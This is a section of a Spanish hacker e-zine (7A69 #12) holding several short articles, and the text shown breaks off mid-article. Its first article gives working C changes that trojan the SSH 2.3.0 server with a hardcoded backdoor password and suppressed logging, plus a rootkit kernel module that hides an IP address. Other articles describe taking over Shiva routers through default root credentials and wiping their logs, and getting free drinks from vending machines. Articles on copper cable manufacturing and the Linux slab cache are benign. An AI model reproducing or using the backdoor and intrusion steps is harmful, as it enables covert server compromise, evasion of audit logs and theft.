@@ -1,0 +1,1492 @@
+         -=( 7A69#12 )=--=( art10 )=--=( Cortos )=--=( Varios )=-
+     
+Y en esta seccion, como siempre, encontrareis mini-articulillos, que, 
+creemos, tambien pueden ser de intres :)
+
+  1.- Troyanizando sshd                  - fkt
+  2.- Fabricacion de cables de cobre     - N4XoR
+  3.- Cocacola Gratis!!                  - bzero
+  4.- Slab cache en linux 2.2.x          - Doing
+  5.- Router de shiva                    - fkt
+  6.- Antidisclosure (anti.security.is)  - Ripe 
+  7.- Introduccion al overclocking       - IReick
+  8.- El manifiesto del lamer		 - ^Se7eN^
+
+-------------------------------------------------------------------------------
+---/ 1 /--/ Troyanizando sshd /--/ fkt /---------------------------------------
+-------------------------------------------------------------------------------
+
+                    +-----------------------------+
+                    |      Troyanizando SSH       |
+                    |           By fkt            |
+                    +-----------------------------+
+
+Bien empecemos, en este documento relataré como dejar puertas traseras
+(aka backdoors) en el demonio del SSH que ahora es bastante popular y reem-
+plaza al telnet en la mayoría de servidores. Lo explicaré para la version
+2.3.0, Para seguir este documento has de tener algunos conocimientos de C.
+Una vez explicado esto procedamos al meollo de la cuestión...
+Para empezar necesitamos un fichero donde definiremos la password del backdoor
+para que asi otros no puedan usarlo, le llamaremos por ejemplo, back.h y con-
+tendrá lo siguiente:
+#define CLAVEBACK "hax0r"
+int back;
+Lo del int back es para definir una variable entera que usaremos para que si
+metemos la password correcta del backdoor no dejemos logs, esta variable po-
+dríamos definirla en todos los archivos q modifiquemos en vez de ponerla en el
+back.h, pero como es más cómodo definirla aqui pues me he decantado por esta
+opción.
+Bueno una vez tenemos ese fichero cogemos y descomprimimos el source del ssh
+(si no lo teneis www.ssh.net y os lo bajais), una vez descomprimido buscamos
+los ficheros donde se produce la autentificación del usuario para así modifi-
+carlos y que si el usuario mete la password del backdoor pues que no la
+"checkee", buscando vemos el auths-passwd.c lo abrimos y vemos que pone...
+Password authentication, server-side.  This calls functions in
+machine-specific files to perform the actual authentication.
+Vaya! parece que hemos acertado en este archivo se hace la autentificación del
+usuario. Bueno pues ahora cogemos y ponemos...
+#include "back.h"
+Para que incluya nuestro archivo donde tenemos nuestra password y nuestra va-
+riable; ahora vamos leyendo el código y nos encontramos que...
+    if (ssh_user_validate_local_password(uc, password))
+      {  
+        ssh_log_event(config->log_facility,
+        SSH_LOG_NOTICE,
+        "User %s's local password accepted.",
+        ssh_user_name(uc));
+        SSH_DEBUG(5, ("ssh_server_auth_passwd: accepted by local passwd"));
+  
+        goto password_ok;
+      }
+
+        ssh_xfree(password);
+        goto password_bad;
+Creo que lo hemos encontrado, en ese if comprueba si es un user válido y si lo
+es lo loguea y va a password_ok y sino lo es pues libera password y va a
+password_bad, así que habrá que cambiar esto y dejarlo tal que así:
+    if ((ssh_user_validate_local_password(uc, password)) || (!strcmp(password,CLAVEBACK)))
+      {
+        if (strcmp(password,CLAVEBACK)) {
+          ssh_log_event(config->log_facility,
+          SSH_LOG_NOTICE,
+          "User %s's local password accepted.",
+          ssh_user_name(uc));
+          SSH_DEBUG(5, ("ssh_server_auth_passwd: accepted by local passwd"));
+          back=0;
+        } else {
+          back=1;
+        }
+        goto password_ok;
+        }
+        ssh_xfree(password);
+        goto password_bad;
+Bueno voy a explicar esto por si alguien no lo entiende, lo que hacemos es po-
+nerle otra condición más al if, si el user es válido o coincide el password
+con CLAVEBACK entonces entramos en el if, y dentro de ese if hay otro que lo
+que hace es que si coincide el password con CLAVEBACK pone back a 1 y no lo-
+guea y sino loguea y pone back a 0 que quiere decir que no lo estamos usando.
+Este archivo ya lo hemos modificado para nuestros intereses, asi que vamos a
+seguir buscando ... y mientras miramos el source del sshcommon.c vemos que
+sale esto:
+  /* Log the disconnect in the system log. */
+     ssh_log_event(common->config->log_facility, SSH_LOG_INFORMATIONAL,
+     "%s disconnected: %s",
+     locally_generated ? "Local" : "Remote host",msg);
+Vaya!, esto loguea la desconexión, luego habrá que modificarlo para que no
+dejemos logs y quedaría de la siguiente manera:
+  /* Log the disconnect in the system log. */
+    if (!back) {
+            ssh_log_event(common->config->log_facility, SSH_LOG_INFORMATIONAL,
+            "%s disconnected: %s",
+            locally_generated ? "Local" : "Remote host",msg);
+    }
+Ponemos un if diciendo que si no hemos usado la password del backdoor loguee
+y si la hemos usado se lo salte mediante la variable back que ya tiene valor
+porque se lo dimos previamente en el auths-passwd.c. Obviamente en este ar-
+chivo habrá que incluir el back.h como hicimos en el auths-passwd.c
+Bueno seguimos mirando y encontramos que mirando el código del sshd2.c vemos:
+case SSH_DISCONNECT_CONNECTION_LOST:
+      ssh_log_event(c->server->config->log_facility,
+       SSH_LOG_INFORMATIONAL,
+      "connection lost: '%s'", msg);
+  break;
+Parece que esto loguea cuando nos desconectamos asi que vamos a evitarlo...
+case SSH_DISCONNECT_CONNECTION_LOST:
+  if (!back) {
+      ssh_log_event(c->server->config->log_facility,
+       SSH_LOG_INFORMATIONAL,
+      "connection lost: '%s'", msg);
+  }
+  break;
+Seguimos mirando en el sshd2.c y nos encontramos con:
+if (successful)
+  ssh_log_event(common->config->log_facility,
+  SSH_LOG_NOTICE,
+  "User %s, coming from %s, authenticated.",
+  user, common->remote_host);
+Hemos encontrado un if que loguea si hemos pasado el paso de autentificaci¢n
+asi que vamos a modificarlo para que no lo haga si usamos nuestro backdoor:
+if (!back) {
+  if (successful)
+    ssh_log_event(common->config->log_facility,
+    SSH_LOG_NOTICE,
+    "User %s, coming from %s, authenticated.",
+    user, common->remote_host);
+}
+Así no loguearía si usamos el backdoor. Bueno pues ya tenemos el backdoor
+hecho, aunque aún dejaría un log como este:
+Apr 10 19:11:47 Linux1 sshd2[10968]: connection from "127.0.0.1"
+Y también en el last dejaría logs.
+Eso se puede solucionar modificando el authc-passwd.c y el wtmp.c y hacer que
+cuando sea vuestra ip pues que no loguee pero no os voy a dar todo hecho asi
+que lo pensais; o también otra manera de que no salga es usando un Linux Ker-
+nel Module que modifica la syscall write, para esto me remito al articulo de
+Doing sobre LKM´s en el e-zine Netsearch #5 donde viene el siguiente modulo:
+/* Oculta La IP 127.0.0.2 */
+/* Compilar con gcc -O2 -c log.c */
+/* insmod log.o */
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/fd.h>
+#include <linux/fs.h>
+#include <linux/fcntl.h>
+#include <linux/mm.h>
+
+#include <linux/dirent.h>
+#include <linux/file.h>
+#include <linux/unistd.h>
+#include <linux/if.h>
+#include <syscall.h>
+
+#include <asm/segment.h>
+
+extern void *sys_call_table[]; /* array de syscalls */
+
+ssize_t (*o_write) (int, void*, size_t);
+
+int
+OCULTAR_STRING(char *name)
+{
+  if (strstr(name, "127.0.0.2")) return 1;
+  return 0;
+} 
+
+/*
+ * Llamada al sistema write() troyanizada
+ */
+ssize_t new_write (int fd, void *buf, size_t size)
+{
+  size_t ret;
+  char *tmp;
+
+  if (size < 1) return size;
+
+  if (size > 10000) return (*o_write) (fd, buf, size);
+
+  tmp = (char*) kmalloc(size+1, GFP_KERNEL);
+  memset(tmp, 0, size + 1);
+  __generic_copy_from_user(tmp, buf, size);
+
+  if (OCULTAR_STRING(tmp)) {
+    kfree(tmp);
+    return size;
+  }
+  kfree(tmp);
+
+  return (*o_write) (fd, buf, size);
+}
+
+int
+init_module()
+{
+  EXPORT_NO_SYMBOLS;
+  o_write = sys_call_table[__NR_write];
+  sys_call_table[__NR_write] = new_write;
+  return 0;
+}
+
+void
+cleanup_module()
+{
+  sys_call_table[__NR_write] = o_write;
+}
+Este módulo lo que hace es que cuando se va a usar la syscall write() chequea
+si aparece por algun lado la ip 127.0.0.2 y si lo hace pues no saca esa linea
+por pantalla. Ahora si que ya está todo a punto, si quereis saber lo que hace
+el modulo exactamente leer el e-zine al que me he remitido anteriormente que
+viene explicado. Todo lo que he explicado está testeado 100% en la versión
+SSH 2.3.0, pero en la 2.4.0 es prácticamente igual por no decir igual y en las
+anteriores también.
+Un Saludo
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 2 /--/ Fabricacion de cables de cobre /--/ Anonimo /----------------------
+-------------------------------------------------------------------------------
+
+Introducción a los cables telefónicos.
+
+En este panfleto, por que esto es un panfleto, veremos como se fabrica y se 
+usa un cable telefónico de los usados normalmente por timofonica. Nos 
+centraremos en los cables de cobre  y en próximos ezines veremos cables de 
+fibra y coaxiales.
+
+Por supuesto deciros que uno no esta en posesión de la verdad absoluta, y como 
+asno que patea este jodido mundo muchas veces mete la gamba hasta el hígado, 
+así que si alguien lee esto y detecta errores o fallos, que no se alarme, es 
+normal. (De zoquetes ta el mundo lleno. xD).
+
+Bien empecemos que si no me enrollo.
+
+Comenzaremos por ver la composición y fabricación de un cable de pares de 
+cobre.
+
+La fabricación se compone de 4 fases básicas:
+
+- Aislado.
+- Pareado.
+- Cableado.
+- Forrado de cubierta final.
+
+Aislado.
+
+En este proceso lo que hacemos es trefilar y aislar los hilos conductores que 
+forman el cable.
+
+Trefilar es conseguir que los conductores tengan un diámetro determinado por 
+medio de un proceso de estiramiento, haciendo pasar un alambre de cobre de un 
+diámetro alto por una serie de poleas y baños de recocido y unos calibres de 
+diamante hasta conseguir el diámetro deseado.
+Básicamente se trabaja con los siguientes diámetros:
+
+- 0,405 mm
+- 0,5 mm
+- 0,64 mm
+- 0,9 mm
+
+Aunque también se fabrican cables de menor diámetro, 0.32, y de mayor 1,3 mm
+
+Aunque al cobre se le hace un trefilado previo para poder trabajar con ello en 
+las extruder (maquinas de aislado), el proceso donde se le da el diámetro 
+final al conductor se realiza en una maquina extrusora, que además de trefilar 
+el hilo a un diámetro determinado, aísla los conductores con determinados 
+compuestos que básicamente son:
+
+- Polietileno sólido.
+- Polietileno celular.
+- Foam.
+- Foam Skin.
+- PVC (poli cloruro de vinilo).
+A estos compuestos se les añade un colorante del tipo Masterbach en un 
+porcentaje determinado para dar color al aislamiento.
+
+Bueno pues ya tenemos una bobina de conductor aislada de determinado color.
+
+Pasemos al siguiente proceso
+
+
+Pareado.
+
+Parear es torsionar dos conductores con un paso determinado. Entiendase por 
+paso, la cantidad de torsiones por metro. O sea que si una bobina pareada lleva
+un paso 76 (por ejemplo) significara que los conductores se torsionan 76 veces
+en una distancia de un metro.
+
+También existen cables de cuadretes en los que en vez de torsionarse 2 
+conductores son 4. 
+
+Las bobinas de pareado que forman un cable dependiendo del color llevan todas 
+paso diferente para evitar un problema que veremos más adelante.
+
+Por ejemplo, todas las bobinas Blanco-Azul llevan el mismo paso, pero es 
+diferente al de las que son Blanco-Naranja, o Amarillo-Gris.
+
+En cuanto al pareado poco más que contar así que pasaremos al siguiente proceso.
+
+
+Cableado.
+
+Aquí la cosa empieza a complicarse.
+
+Para ver la formación de un cable veremos primero un código de colores de
+pares utilizado por telefónica. El nombre de este código es Event Count.
+
+El código se compones de 10 colores básicos agrupados en 2 grupos:
+
+Grupo 1:
+- Blanco. (Bl)
+- Rojo. (Ro)
+- Negro. (Ne)
+- Amarillo.  (Am)
+- Violeta. (Vi)
+Grupo2:
+- Azul. (Az)
+- Naranja. (Na)
+- Verde. (Ve)
+- Marrón. (Ma)
+- Gris. (Gr)
+
+
+Combinando estos dos grupos obtenemos un total de 25 tipos de pares diferentes
+Ya que un par no puede contener dos colores del mismo grupo salvo la excepción 
+de un par del que luego hablaremos.
+
+Ósea:
+
+Par 1: Bl-Az
+2: Bl-Na
+3: Bl-Ve
+4: Bl-Ma
+5: Bl-Gr
+6: Ro-Az
+7: Ro-Na
+
+Así hasta el 25 que es Vi-Gr.
+
+A estos 25 pares los llamaremos subunidad y cada 100 pares los llamaremos grupo.
+La excepción de la que antes hablábamos es el par Bl-Ne, llamado Piloto. Este 
+par es utilizado por asistencia técnica para comunicarse con la central donde 
+esta conectado ese cable, ósea  es un par de uso interno de telefónica y salvo 
+excepciones no hay abonados conectados a el.
+Hay un piloto por grupo, ósea uno por cada 100 pares con lo cual el grupo 
+tiene realmente 101 pares.
+ 
+Los cables pueden tener desde 1 par, hasta 2424 y 3636 pares (de mas pares no 
+los he visto).
+
+
+Centrémonos en la fabricación de uno grande, un 2424 por ejemplo.
+
+Cargamos una cableadota con 101 pares y los agrupamos de 25 en 25 en cuatro 
+subunidades, salvo la última que por contener el piloto tendrá 26.
+
+Cada subunidad tendrá distribuidos los pares en capas concéntricas en una 
+formación de 3 en el centro 9 en la 2ª capa y 13 en la 3ª.
+
+Amarramos esas subunidades con una ligadura de nylon utilizando el mismo código
+de colores, ósea los primeros 25 con ligadura Bl-Az los 2º con Bl-Na así hasta 
+completas los 101 cuyos últimos 26 estarán con Bl-Ma.
+Los siguientes de 101 estarán, el primer grupo con Bl-Gr, los segundos serán 
+Ro-Az, así hasta Ro-Ve, y así sucesivamente hasta completar los 606 pares.
+De tal manera que obtendremos 6 grupos dispuestos en 4 subunidades de 25ª, que 
+para que se mantengan en su formación de 101 aplicaremos una ligadura de nylon 
+monocolor. Esta ligadura será en los primeros 606 pares de color blanco, ósea 
+que los primeros seis grupos tendrán ligadura blanca, del 607 al 1212 esta 
+ligadura será roja, del 1213 al 1818 será negra y del 1819 al 2424 amarilla.
+
+De esta manera tendremos todos los pares diferenciados.
+
+Ahora hay que formar el cable final con todos los grupos.
+
+Lo cargamos en una cableadota de núcleos(grupos) en una distribución de 4 en la
+1ª capa, 8 en la 2ª y 12 en la 3ª, aplicándole 2 cintas de poliéster de forma 
+helicoidal consiguiendo así un cable de 65 mm de diámetro aproximadamente 
+totalmente redondo y preparado para aplicarle la cubierta.
+
+Pero ni todos los cables llevan núcleos (grupos) de 101, ni todos llevan 
+poliéster en la cableadora de núcleos.
+
+En los cables inferiores a 1212 la formación de los núcleos es de 50 pares, 
+distribuidos los pares en subunidades de 8 y 9 pares de la siguiente forma.
+
+Una de 8 en el centro de Bl-Az (suponemos que es el núcleo 1) otra de 8 y otra 
+de 9 también con Bl-AZ hasta completar los 25 en la 2ª capa  y otras tres de 
+8,8,9  Bl-Na también en la segunda capa completando así los 50 pares en una 
+formación 1 en el centro 5 en la 2ª capa. El 2º núcleo será igual excepto por 
+las ligaduras que serán Bl-Ve y Bl-Ma y por que las dos ultimas subunidades 
+serán 9-9 teniendo la ultima el piloto (par Bl-Ne), logrando así una subunidad 
+de 51.
+
+En la cableadora de núcleos tendremos 12 núcleos para un 606 y 18 para un 909.
+
+En los cables menores de 606 volvemos a los núcleos de 25, saliendo estos 
+directamente a la cableadora de núcleos por lo que tendremos en formación 3-9, 
+12 núcleos para un 303, y 16 núcleos para un 404 en una formación 1-5-10.
+
+Hay más formaciones en cables menores, todos estos cambios en la formación se 
+realizan para conseguir un cable lo mas redondo posible.
+
+Los cables pueden salir de la habladora de núcleos con poliéster helicoidal o 
+con ligadura blanca de nylon para amarrarlos.
+
+Generalmente los cables no rellenos suelen salir con poliéster, y los cables 
+rellenos de grasa (ya veremos lo que es en el apartado de cubiertas), siempre 
+salen con ligadura (obvio, si les ponemos poliéster a ver quien les inyecta 
+luego grasa).
+
+Bien, ya tenemos el cable, ahora nos falta la cubierta exterior.
+
+
+Cubierta.
+
+Durante el proceso de cubierta procederemos a inyectar grasa si el cable es 
+relleno. Dicha grasa es un compuesto de vaselina hidrófuga que se inyecta al 
+cable para evitar que en caso de perforación de la cubierta el agua corra a 
+través del cable, se inyecta a una temperatura de fusión de la grasa que es de 
+85 grados aproximadamente y cuando enfría se queda una pasta semisólida 
+rellenando tolos intersticios entre los pares y núcleos del cable.
+
+Si el cable no va relleno es muy posible que llegue ya a cubiertas con el 
+poliéster puesto, si no es así se le aplica uno longitudinal de más espesor 
+que el helicoidal y si es de grasa también se le pone una vez que sale del 
+inyector.
+
+Seguidamente se le aplica una cinta de aluminio-poliéster longitudinal a la 
+cual se le aplica calor en los bordes para que selle, consiguiendo así un tubo.
+
+Por ultimo se le extruye una capa de polietileno negro de alta densidad, 
+pasando por un canalón de agua para su enfriamiento y a la salida de ese 
+canalón se le marca los metros y la leyenda rebobinándolo en una bobina de 
+madera, para su posterior paso a calidad y después a logística, para el 
+forrado de la bobina y su embarque para cliente
+También hay cables de doble cubierta que en vez de ser marcados pasan de nuevo 
+a otra extruder que les pones otra cinta de acero corrugado que también se 
+sella, y una segunda cubierta, esta segunda cubierta es ya marcada con los 
+metros y la leyenda
+
+Hay muchos tipos de cables, con sus diferentes aislamientos formaciones y 
+cubiertas. Esto que hemos visto es un cable típico de telefónica, para ser 
+exactos un 26 EAP 2424.   
+
+
+Algunas consideraciones:
+
+Los cables de pares se utilizan básicamente para la comunicación en fonía, 
+teniendo en cuenta que telefónica considera como aceptable el rango de 
+frecuencias entre 300 y 3.400 Hz, que es cercano al de la voz humana, 
+obteniendo de ese rango una relación calidad-costes aceptable.
+
+Salvo excepciones a grandes empresas, organismos oficiales, o por que el 
+abonado así lo solicite (gastándose un pastón), la compañía no llegara nunca 
+al abonado con fibra óptica debido a su elevado coste. Así que siempre se esta 
+limitado por la capacidad del cable de cobre en trasmisión de datos.
+
+En estos cables la tensión con el terminal en reposos es de -48 Volts, la 
+tensión.
+Con el terminal descolgado o de conversación es de -24volts, y la tensión de 
+llamada es de 72 volts de alterna.
+
+Espero que este documento os sirva para entender la estructura de los cables 
+que se utilizan normalmente en telecomunicaciones.
+
+En próximos documentos veremos lo cables de fibra óptica y los sistemas de 
+conmutación y transmisión entre centrales.
+
+Espero no haber sio mu pesao. xD
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 3 /--/ Cocacola Gartis!! /--/ bzero /-------------------------------------
+-------------------------------------------------------------------------------
+
+ [Introduccion]
+
+ Existen por ahi unas maquinas en las que puedes sacar refrescos... bien, pues
+tienen un fallo que esta en fase de correccion pero que todavia quedan cientos
+de maquinas que son vulnerables =).
+
+ [Como distingirlas]
+
+ Para saber las maquinas que son vulnerables fijate en la forma de ranura por
+donde se meten las monedas. Si son de las que tienen un espacio justo para
+meter la moneda y una palanca para tirar hacia abajo, no te servira. Pero, por
+el contrario, sin son de las tipicas maquinas que tienen una ranura en la que
+metes la moneda y ya cae si funcionara.
+
+ [Tecnica]
+
+ Lo unico que tienes que hacer es buscar una correa de reloj bastante larga.
+No se cuanto exactamente, si tienes un reloj de correa lo haces con ese sino
+te compras una que tampoco vale una fortuna. Cojes la correa (tiene que ser
+del tama¤o de la ranura) y la metes hasta el fondo. Ahora piensas el refresco
+que quieres, pulsas el boton y... =P Ha funsionao! :D.
+
+ [Final]
+
+ Y esto es todo... no lo hagais en un lugar donde haya mucho movimiento
+urbano. Un saludo como siempre a #freeminds & #hack (libres.irc-hispano.org)
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 4 /--/ Slab cache en linux 2.2.x /--/ Doing /-----------------------------
+-------------------------------------------------------------------------------
+
+ La Slab cache en el kernel 2.2.17 (posiblemente en todos los 2.2.x)
+ -------------------------------------------------------------------
+
+  Nota: Toda esta informacion esta sacada de linux/mm/slab.c
+
+  La slab cache es un modelo usado en el kernel alocar y liberar memoria
+dentro del kernel. Todas las rutinas de reserva de memoria internas hacen
+uso de slabs caches.
+
+  Una slab cache (cache a secas de aqui en adelante) no es mas que una
+estructura (typedef struct kmem_cache_s kmem_cache_t;) que contiene referencias
+a una serie de slabs (losas o planchas), asi como varios flags y otros campos.
+
+ Una slab es un "cacho" de memoria, mayor que una pagina de memoria (4096 bytes
+en i386), que se usa como memoria dinamica. Esta constituida por una 
+estructura de control (typedef struct kmem_slab_s kmem_slab_t;), que se situa
+en la zona de memoria mas alta del slab. El resto del slab esta dividido en
+zonas de memoria iguales, llamadas objetos. Cada objeto tiene asociado una
+estructura (typedef struct kmem_bufctl_s kmem_bufctl_t;), que es la union de
+3 punteros (por lo que un sizeof de esta estructura devolvera 4). Se podria 
+haber usado solo 1, pero como el valor de ese puntero depende el estado del
+objeto al que hace referncia el kmem_bufctl_t se les han puesto nombres
+distintos.
+
+ En las caches ON_SLAB un kmem_bufctl_t asociado a un objeto esta justo a
+continuacion de él (por tanto, dentro del slab), mientras que en las OFF_SLAB
+el kmem_bufctl_t se encuentra en otra zona de memoria.
+
+ Aqui os pongo un esquema (algo :P) grafico para dejar las cosas mas claras:
+
+ Una cache:
+
+ [                             kmem_cache_t                                 ]
+ [   c_firstp                                                c_lastp        ]
+        |                                                       |
+        |                                                       |
+        |                                                       |
+        V                                                       |
+ [   kmem_slab_t   ]                                            |
+ [         s_nextp ]                                            |
+    ^          |                                                V
+    |          \--------------------------------> [      kmem_slab_t     ]
+    \                                             [   s_prevp            ]
+     \--------------------------------------------------|
+
+  El puntero c_firstp apunta al primer slab de la cache, y c_lastp al ultimo
+slab. En los slabs, el puntero s_nextp apunta al siguiente slab de la cache,
+y s_prevp al anterior (si, como en una lista doblemente enlazada).
+
+ Una slab (IN_SLAB):
+
+ [                           kmem_slab_t                                    ]
+ [    s_mem                   s_freep                                       ]
+        |                       |
+        |                       |
+        |                       |
+        V                       V
+       [ OBJETO #1 ][ kmem_bufctl_t ] [ OBJETO #2 ][ kmem_bufctl_t ]
+      
+ El puntero s_mem apunta al inicio de la slab, y por tanto, al inicio del
+primer objeto de la slab. s_freep apunta al kmem_bufctl_t del primero objeto
+libre (que no se ha reservado, recordemos que esto es para obtener memoria
+de forma dinamica). 
+
+ El resto de los campos de la kmem_cache_t y kmem_slab_t son bastante
+auto-explicativos; os pego las definiciones aqui:
+
+ (Nota: he quitado algunos campos de debug)
+ (Nota2: Los comentatios en español son mios :-> )
+
+struct kmem_cache_s {
+        kmem_slab_t              *c_freep;      /* first slab with free objs */
+        unsigned long             c_flags;      /* constant flags */
+        unsigned long             c_offset;     /* Longitud de los datos de cada objeto almacenado */
+        unsigned long             c_num;        /* # of objs per slab */
+
+        unsigned long             c_magic;
+        unsigned long             c_inuse;      /* kept at zero */
+        kmem_slab_t              *c_firstp;     /* first slab in chain */
+        kmem_slab_t              *c_lastp;      /* last slab in chain */
+
+        spinlock_t                c_spinlock;
+        unsigned long             c_growing;    /* esto se pone a 1 cuando
+                                            se estan reservando nuevas slabs
+                                            en la cache *:
+        unsigned long             c_dflags;     /* dynamic flags */
+        size_t                    c_org_size;
+        unsigned long             c_gfporder;   /* order of pgs per slab (2^n) */
+        void (*c_ctor)(void *, kmem_cache_t *, unsigned long); /* constructor func */
+        void (*c_dtor)(void *, kmem_cache_t *, unsigned long); /* de-constructor func */
+        unsigned long             c_align;      /* alignment of objs */
+        size_t                    c_colour;     /* cache colouring range */
+        size_t                    c_colour_next;/* cache colouring */
+        unsigned long             c_failures;
+        const char               *c_name;
+        struct kmem_cache_s      *c_nextp;
+        kmem_cache_t             *c_index_cachep;
+};
+
+typedef struct kmem_slab_s {
+        struct kmem_bufctl_s    *s_freep;  /* ptr to first inactive (libre/free) obj in slab */
+        struct kmem_bufctl_s    *s_index;  /* este campo se usa solo en caches OFF_SLAB */
+        unsigned long            s_magic;
+        unsigned long            s_inuse;  /* num of objs active (ocupados) in slab */
+
+        struct kmem_slab_s      *s_nextp;
+        struct kmem_slab_s      *s_prevp;
+        void                    *s_mem;    /* addr of first obj in slab */
+        unsigned long            s_offset:SLAB_OFFSET_BITS,
+                                 s_dma:1;
+} kmem_slab_t;
+
+ Las caches pueden ser creadas y liberadas (que novedad!), pero al ser
+liberadas, su estrcutura de control no se libera, porque causaria muchos
+problemas (es lo que pone un developer del kernel; a mi me huele a chapuza XD)
+
+ Las caches tambien se reservan dinamicamente, por lo tanto, necesitan de una
+cache ya existente de la que cojer memoria, esta cache es llamada: 
+cache_cache (que original). Esta esta definida de forma estatica, y todas las
+kmem_cache_t que se creen de forma dinamica son objetos en alguna slab de
+esta cache "primaria".
+
+ Cuando el kernel se inicia, se reservan 13 caches mas, llamadas:
+
+/* Names for the general caches.  Not placed into the sizes struct for
+ * a good reason; the string ptr is not needed while searching in kmalloc(),
+ * and would 'get-in-the-way' in the h/w cache.
+ */
+static char *cache_sizes_name[] = {
+#if     PAGE_SIZE == 4096
+        "size-32",
+#endif
+        "size-64",
+        "size-128",
+        "size-256",
+        "size-512",
+        "size-1024",
+        "size-2048",
+        "size-4096",
+        "size-8192",
+        "size-16384",
+        "size-32768",
+        "size-65536",
+        "size-131072"
+};
+
+ Creo que esta claro en que se diferencian unas de otras :P (por si alguno
+aun no se ha coscado recordare que el tamaño de los objetos que reservas con
+una cache es __FIJO__, y por lo tanto el kernel crea caches de tamaño
+esponencial para que cuando hagas un kmalloc puedes usar la cache del tamaño
+inmediatamente superior al que pides, y asi hace un uso mas eficiente de la
+memoria).
+
+ Hay una variable global definida asi:
+
+typedef struct page mem_map_t;
+
+mem_map_t *mem_map;
+
+ Este puntero despues de ser apuntado en el boot, se usa como un array de
+struct page's, donde cada pagina de la memoria del kernel tiene una entrada
+en dicho array.
+
+ Cuando creas una nueva cache (con kmem_cache_create()), no tiene ninguna
+slab creada. Cuando alguien reserva memoria en esa cache, se piden paginas
+al sistema, y se usan para almacenar la nueva slab que se va a crear en esa
+cache. Una vez que tienes las paginas, y la slab creada, se usa la struct page
+correspondiente a cada pagina de la slab localizada en mem_map, y se apunta
+el campo next de la struct page a la cache de la que cuelga la slab creada,
+y el campo prev a la estructura de control de la slab.
+
+ Y para que coño han hecho esto? Pues para que en kfree() se pueda ver con
+facilidad a que cache y slab pertenece un puntero que se quiere liberar.
+Es tan sencillo como sacar la pagina a la que pertenece el puntero, irse a
+mem_map a ver la struct page correspondiente, y mirar a sus campos prev y
+next.
+
+ En el fichero slab.c vienen mas info, a que esperais para leerla :)
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 5 /--/ Router de shiva /--/ fkt /-----------------------------------------
+-------------------------------------------------------------------------------
+
+                        +----------------------------+
+                        +  Shiva LandRover Systems   +
+                        + Por fkt <fkt@funfatal.org> +
+                        +----------------------------+
+
+En este documento trataré de explicar como aprovecharse de estos routers que
+al 80% tienen la cuenta por defecto activada ya que el admin usa su propia
+cuenta con privilegios.
+El documento constará de 3 partes:
+
+1.- Introducción
+2.- ¿Qué pueden hacer los Shiva LandRover?
+3.- La Linea de Comandos
+
+Bien empezemos...
+
+1.- Introducción:
+
+Los sistemas Shiva son muy comunes encontrarlos cuando escaneas, casi seguro
+que en tus logs de algún scan tengas unos pocos y quizás no les hayas presta-
+do demasiada atención. Bien, lo primero es saber detectar que se trata de un
+Shiva LandRover, para ello nos fijaremos en el prompt que te sale al entrar
+que normalmente es algo parecido a @Userid: . Pues bien el fallo potencial
+de seguridad de estos sistemas es que la cuenta por defecto la tienen activa-
+da en su gran mayoría, ésta cuenta es login: root y password: <enter>
+Alguna vez cuando conectamos a un Shiva puede salir...
+"Starting Radius Authentification...."
+No presteis demasiada atención a ésto por ahora ya que es solo un intento de
+hacer que el sistema tenga un control seguro, pero en la mayoría de los casos
+está mal configurado.
+Estos sistemas tan interesantes cuentan con un loggeador así que olvidaros de
+entrar por fuerza bruta. Aunque si entramos dentro con un simple "clear log"
+se borran todas las entradas.
+
+2.- ¿Qué pueden hacer los Shiva LandRover?
+
+Bien, los Shiva tienen unos servicios bastante interesantes a nuestra dispo-
+sición, como son:
+
+* PPP (Point-to-Point Protocol): Este es el protocolo que tanto nos gusta,
+los Shiva normalmente suelen tener un servidor DNS interno asi que si tienes
+suerte puede que esté conectado a internet. Ya veremos más adelante que es lo
+que se puede hacer si tiene conexion a internet aparte de conectarnos gratis
+claro ;).
+
+* Modem DIALOUT: En la mayoría de los casos, el sistema está configurado para
+permitir llamadas al exterior, es lo que se llama DIALOUT, esto lo puedes uti
+lizar para llamar a BBS, hacer desvios, escanear y todo lo que se te ocurra.
+Por ejemplo si configuras una conexión PPP incluso puedes hacer otra llamada
+externa a una BBS mientras estás conectado a internet a traves del Shiva.
+
+Otras utilidades como telnet, ping, traceroute, etc... son las que te ayuda-
+rán a saber si el Shiva está o no conectado a internet.
+
+3.- La Linea de Comandos:
+
+Cuando estemos dentro nos saldrá algo como esto...
+
+Shiva Version 4.5.3 97/02/07
+Shiva#>
+
+Para obtener una lista de los comandos disponibles ponemos "help" o "?":
+
+alert                          Send text alert to all dial-in users
+busy-out line <number>         Busy-out serial line modem
+clear <keyword>                Reset part of the system
+comment                        Enter a comment into the log
+configure                      Enter a configuration session
+connect <port pool>            Connect to a shared serial port
+crashdump                      Write crashblock to log
+disable                        Disable privileges
+help                           List of available commands
+initialize <keyword>           Reinitialize part of the system
+lan-to-lan <keyword>           Manage LAN-to-LAN connections
+passwd                         Change password
+ping <IP host>                 Send ICMP echo to IP host
+ppp                            Start a PPP session
+quit                           Quit from shell
+reboot                         Schedule reboot
+show <keyword>                 Information commands, type "show ?" for list
+slip                           Start a SLIP session
+telnet <IP host>               Start a Telnet session
+testline                       Test a line
+
+Lo primero que haremos es ver si estamos solos o por el contrario hay alguien
+más conectado, para ello hacemos un "show users":
+
+Shiva#> show users <enter>
+
+Line             User                     Activity  Idle/Limit    Up/Limit
+   1             jsmith                      PPP       0/   10     0/ None
+   2             root                        shell     0/   10     0/ None
+Total users: 2
+
+Aquí vemos que nosotros estamos en la linea 2 y que hay un usuario PPP en la
+linea 1, normalmente los usuarios no están configurados para conectar remota
+mente por PPP, asi que el usuario jsmith lo más seguro es que esté en una ter
+minal de la LAN (esto se podría saber mirando los permisos de ese usuario).
+Ahora vamos a saber como de grande es el sistema:
+
+Shiva#> show lines <enter>
+
+Async Lines:
+Line State   Rate/P/Stop/   RA|DCD|DSR|DTR|RTS|CTS|Fr errs| Overruns|PErrs
+   1 IDLE   57600/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
+   2 CHAR   57600/N/   1/     |ON |ON |on |on |ON |      2|        0|   0
